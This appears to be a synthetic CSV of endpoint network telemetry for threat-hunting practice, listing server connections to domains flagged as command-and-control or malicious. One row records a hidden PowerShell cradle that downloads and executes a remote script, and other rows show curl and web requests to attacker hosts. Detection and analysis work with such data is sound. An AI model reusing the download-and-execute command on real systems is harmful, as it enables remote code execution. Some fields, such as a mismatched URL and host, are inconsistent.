TimeGenerated,DeviceName,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteUrl,RemoteIP,RemotePort,ReportId,ActionType,Protocol,DeviceId,ThreatIndicators,RemoteCountry,IsExternalConnection
2025-10-15T08:14:00Z,SRV-DB01,cmd.exe,cmd.exe /c nslookup new-c2-domain.info,new-c2-domain.info,103.88.44.12,53,88451234,DNSQuery,UDP,5b8b6a11-f821-4fd6-b1ae-1fd9b220ab54,NewlyRegisteredDomain,US,TRUE
2025-10-15T08:17:30Z,SRV-WEB01,powershell.exe,powershell.exe Invoke-WebRequest http://new-c2-domain.info/health,new-c2-domain.info,103.88.44.12,80,88451235,ConnectionAttempt,TCP,b8a6dfe7-97a0-4233-b80b-01f58fda0032,NewlyRegisteredDomain,US,TRUE
2025-10-15T08:20:15Z,SRV-APP02,chrome.exe,chrome.exe https://staging-malicious-domain.org/login,staging-malicious-domain.org,185.222.80.11,443,88451236,ConnectionSuccess,TCP,7a9129cf-2b20-45e4-ae53-7086e900a932,SuspiciousDomain,DE,TRUE
2025-10-15T08:25:02Z,SRV-WEB01,powershell.exe,powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://mal-domain.live/a.ps1'),mal-domain.live,103.45.87.12,80,88451237,ConnectionSuccess,TCP,b8a6dfe7-97a0-4233-b80b-01f58fda0032,MaliciousDomain,RU,TRUE
2025-10-15T08:27:18Z,SRV-DB01,svchost.exe,svchost.exe attempting connection,reg-portal.biz,45.77.90.33,443,88451238,ConnectionAttempt,TCP,5b8b6a11-f821-4fd6-b1ae-1fd9b220ab54,SuspiciousDomain,NL,TRUE
2025-10-15T08:33:41Z,SRV-APP02,python.exe,python.exe connect.py,domain-updater.net,51.91.60.45,8080,88451239,ConnectionAttempt,TCP,7a9129cf-2b20-45e4-ae53-7086e900a932,NewlyRegisteredDomain,FR,TRUE
2025-10-15T08:40:12Z,SRV-WEB01,powershell.exe,powershell.exe Invoke-RestMethod https://domain-updater.net/ping,domain-updater.net,51.91.60.45,443,88451240,ConnectionSuccess,TCP,b8a6dfe7-97a0-4233-b80b-01f58fda0032,NewlyRegisteredDomain,FR,TRUE
2025-10-15T08:45:25Z,SRV-DB01,system,system process network call,datahubportal.co,104.21.12.45,443,88451241,ConnectionSuccess,TCP,5b8b6a11-f821-4fd6-b1ae-1fd9b220ab54,NewlyRegisteredDomain,US,TRUE
2025-10-15T08:47:33Z,SRV-APP02,cmd.exe,cmd.exe /c curl http://mal-domain.live/api,mal-domain.live,103.45.87.12,80,88451242,ConnectionSuccess,TCP,7a9129cf-2b20-45e4-ae53-7086e900a932,MaliciousDomain,RU,TRUE
2025-10-15T08:55:00Z,SRV-WEB01,powershell.exe,powershell.exe Invoke-WebRequest http://test-staging.biz/update,serveo.net,178.32.100.78,80,88451243,DnsQueryResponse,TCP,b8a6dfe7-97a0-4233-b80b-01f58fda0032,NewlyRegisteredDomain,GB,TRUE
